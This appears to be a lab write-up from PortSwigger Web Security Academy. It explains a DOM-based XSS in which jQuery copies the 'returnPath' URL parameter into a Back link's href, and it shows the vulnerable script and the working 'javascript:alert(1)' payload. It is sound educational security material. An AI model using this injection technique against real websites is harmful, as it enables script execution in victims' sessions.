# DOM XSS in jQuery Anchor `href` Attribute Sink Using `location.search` Source

## 1. Lab / Target

**Platform:** PortSwigger Web Security Academy
**Vulnerability:** DOM-based Cross-Site Scripting (XSS)
**Target:** PortSwigger Web Security Academy Lab

### Objective

The objective of this lab was to identify and exploit a DOM-based XSS vulnerability caused by user-controlled input from `location.search` being assigned to an anchor element's `href` attribute through jQuery.

---

## 2. Initial Reconnaissance

After opening the lab, I was redirected to the **Submit feedback** page.

The URL contained the following query parameter:

```text
/feedback?returnPath=/
```

The page also contained a **Back** link.

Because the `returnPath` parameter appeared to control the destination of the Back link, I investigated whether the parameter was processed by client-side JavaScript.

Inspecting the DOM showed:

```html
<a id="backLink" href="/">Back</a>
```

I then inspected the page's JavaScript and identified the following code:

```javascript
$(function() {
    $('#backLink').attr(
        "href",
        (new URLSearchParams(window.location.search)).get('returnPath')
    );
});
```

This was the key finding. The application retrieves the `returnPath` value from the URL and assigns it directly to the `href` attribute of the Back link.

### Evidence

**Screenshot 1 — Initial Request**

Shows the `returnPath` parameter in the URL.

**Screenshot 2 — DOM and JavaScript**

Shows the Back link and the JavaScript responsible for assigning its `href` value.

---

## 3. Source-to-Sink Analysis

The JavaScript revealed the following data flow:

```text
window.location.search
        ↓
URLSearchParams
        ↓
returnPath
        ↓
jQuery .attr("href", ...)
        ↓
<a id="backLink" href="...">
```

### Source

The source is the URL query string:

```javascript
window.location.search
```

The application extracts the `returnPath` parameter using:

```javascript
(new URLSearchParams(window.location.search)).get('returnPath')
```

### Sink

The extracted value is passed directly to jQuery's `attr()` method:

```javascript
$('#backLink').attr("href", userControlledValue);
```

This creates a potentially dangerous DOM data flow because the value is assigned to an `href` attribute without validation restricting the allowed URL scheme.

An `href` attribute can accept a `javascript:` URI, which can result in JavaScript execution when the link is activated.

---

## 4. Exploitation

I first verified that the `returnPath` parameter was controllable by replacing its value with a harmless string:

```text
/feedback?returnPath=test123
```

After the page loaded, the Back link contained:

```html
<a id="backLink" href="test123">Back</a>
```

This confirmed that attacker-controlled input from the URL reached the identified sink.

I then tested the following JavaScript URI:

```text
javascript:alert(1)
```

The resulting URL was:

```text
/feedback?returnPath=javascript:alert(1)
```

After the page loaded, the DOM contained:

```html
<a id="backLink" href="javascript:alert(1)">Back</a>
```

The payload had therefore reached the sink without being neutralized.

---

## 5. Proof of Concept

I clicked the modified **Back** link.

The browser interpreted the `javascript:` URI and executed:

```javascript
alert(1)
```

An alert dialog was displayed, confirming successful JavaScript execution.

### Evidence

**Screenshot 2 — Injected Payload**

Shows the `javascript:alert(1)` payload reflected into the `href` attribute:

```html
<a id="backLink" href="javascript:alert(1)">Back</a>
```

**Screenshot 3 — JavaScript Execution**

Shows the resulting `alert(1)` dialog after activating the vulnerable link.

The successful execution confirms the presence of a **DOM-based XSS vulnerability**.

---

## 6. Technical Analysis

The vulnerability results from an unsafe flow of user-controlled data from the URL into a JavaScript-capable DOM context.

## 7. Impact

In a real-world application, DOM-based XSS can allow an attacker to execute arbitrary JavaScript in the security context of the vulnerable origin.

Depending on the application's functionality and security controls, successful exploitation could allow an attacker to:

* Manipulate page content.
* Perform actions using the victim's existing privileges.
* Access sensitive information exposed to JavaScript.
* Modify the application's UI.
* Conduct phishing or other client-side attacks.

The practical impact depends on the application's architecture, authentication model, available browser protections, and the data and functionality accessible within the vulnerable origin.

---

## 8. Conclusion / Takeaway

This lab demonstrated how a DOM-based XSS vulnerability can arise when client-side JavaScript takes attacker-controlled data from `location.search` and assigns it to a JavaScript-capable DOM sink.

The investigation followed this process:

```text
Identify an interesting URL parameter
            ↓
Inspect client-side JavaScript
            ↓
Trace the source-to-sink data flow
            ↓
Confirm control over the parameter
            ↓
Test the href attribute with a javascript: URI
            ↓
Trigger the modified link
            ↓
Confirm JavaScript execution
```

The key takeaway is that DOM XSS testing requires understanding **how data flows through client-side JavaScript**, rather than only looking for reflected input in the server response.

In this case, the vulnerable data flow was:

```text
location.search → returnPath → jQuery .attr("href", ...) → javascript: URI → JavaScript execution
```

This demonstrated how insufficient validation of URL schemes can turn a seemingly normal navigation parameter into a DOM-based XSS vulnerability.

